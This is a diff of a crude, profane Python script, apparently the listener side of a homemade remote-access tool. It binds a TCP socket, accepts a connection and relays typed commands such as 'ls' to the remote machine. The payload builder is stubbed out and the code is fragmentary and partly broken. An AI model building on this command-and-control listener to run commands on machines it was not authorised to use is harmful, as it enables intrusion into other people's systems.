@@ -6,47 +6,43 @@ import pickle
 import time
 import pip
 
-def install_and_import(package):
-    import importlib
-    try:
-        importlib.import_module(package)
-    except ImportError:
-        import pip
-        pip.main(['install', package])
-    finally:
-        globals()[package] = importlib.import_module(package)
-
-
-install_and_import(pyinstaller)
-
-
 print("What the fuck you want")
 print("1. Listen")
 print("2. Create payload")
 
+
 q = input()
 if q == "1":
     os.system("clear")
+    os.system("cls")
     print("ok what ip")
     TCP_IP = input()
+    os.system("cls")
     os.system("clear")
     print("ok thanks. what port")
     TCP_PORT = int(input())
+    print("fuck you anyway")
+    time.sleep(1)
+    os.system("clear")
+    os.system("cls")
 elif q == "2":
+    print("ok so create a payload huh? i dont care so im not doing it")
+
+# Initialization and stuff
 
 
-TCP_IP = '127.0.0.1'
-TCP_PORT = 5006
 BUFFER_SIZE = 1024
-MESSAGE = "Hello, World!"
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind((TCP_IP, TCP_PORT))
 s.listen(1)
 s, addr = s.accept()
 print('Connection address:', addr)
+
+
 while True:
     s.settimeout(60)
+    thing = input()
     thing2 = thing.split()
     if thing2[0]:
         if thing2[0] == "ls":
